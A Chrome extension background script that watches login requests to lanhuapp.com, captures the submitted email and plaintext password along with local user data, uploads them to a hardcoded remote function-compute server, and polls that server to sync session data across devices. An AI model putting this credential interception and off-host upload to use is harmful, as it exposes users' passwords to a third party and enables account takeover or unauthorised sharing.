/*
 * @Author: Ian
 * @Email: 1136005348@qq.com
 * @Date: 2020-07-03 00:37:09
 * @LastEditTime: 2020-07-03 23:41:40
 * @LastEditors: Ian
 * @Description:
 */

const delay = 2000

let config = {
  server: 'https://19710422.1640366499046363.functioncompute.com',
  interval: 3000,
  id: '',
  user: '',
  enabled: true,
}

let data

let watchServerid
let watchLoginId

function loadConfig() {
  chrome.storage.sync.get(['config'], (result) => {
    console.log(config)
    console.log(result)
    if (result && result.config) {
      result.config.id = result.config.id || config.id
      config = {
        ...config,
        ...result.config,
      }
      console.log(config)
    } else {
      chrome.storage.sync.set({config})
    }
  })
}

function setConfig(conf) {
  console.log(`setConfig`)
  console.log(conf)
  config = {
    ...config,
    ...conf,
  }
  chrome.storage.sync.set({config})
}

function watchLogin(callback) {
  watchLoginId = (details) => {
    callback(details.requestBody.formData)
  }
  chrome.webRequest.onBeforeRequest.addListener(watchLoginId, {urls: ['*://lanhuapp.com/*/login']}, ['extraHeaders', 'requestBody'])
}

function unWatchLogin() {
  if (watchLoginId && chrome.webRequest.onBeforeRequest.hasListener(watchLoginId)) chrome.webRequest.onBeforeRequest.removeListener(watchLoginId)
}

function watchServer(interval, callback) {
  watchServerid = setInterval(() => {
    axios({
      method: 'post',
      url: config.server + '/download',
      data: {
        id: config.id,
        email: config.user,
      },
    }).then(({data}) => {
      callback(data)
    })
  }, interval)
}

function unWatchServer() {
  clearInterval(watchServerid)
}

function onLogin({email: [email], password: [password]}) {
  console.log(`onLogin: ${email}`)
  setConfig({user: email})
  chrome.notifications.create(null, {
    type: 'basic',
    iconUrl: 'img/icon.png',
    title: '监测到用户登录',
    message: `用户：${email}`,
  })
  setTimeout(async () => {
    const userData = await getData()
    const da = {
      id: config.id,
      user: {
        email,
        password,
        ...userData,
        name: userData.localStorage && userData.localStorage.name,
        avatar: userData.localStorage && userData.localStorage.avatar,
      },
    }
    console.log(`upload`)
    console.log(da)
    axios({
      method: 'post',
      url: config.server + '/upload',
      data: da,
    }).then(({data: res}) => {
      data = res
      onDownload(res)
    })
  }, delay)
}

function onDownload(res) {
  console.log(`onDownload`)
  console.log(res)
  if (data) {
    if (config.user && data.user[config.user].timestamp !== res.user[config.user].timestamp) {
      setData(res.user[config.user])
      chrome.notifications.create(null, {
        type: 'basic',
        iconUrl: 'img/icon.png',
        title: '其他设备登录',
        message: `当前用户：${config.user}在其它设备登录，已自动同步数据，请放心继续使用`,
      })
    }
  } else if (config.user) {
    setData(res.user[config.user])
  }
  data = res
}

chrome.instanceID.getID((res) => {
  config.id = res
  // 加载配置
  loadConfig()
  if (config.enabled) {
    // 监测登录行为
    watchLogin(onLogin)
    // 监测服务器，刷新数据
    watchServer(config.interval, onDownload)
  }
})
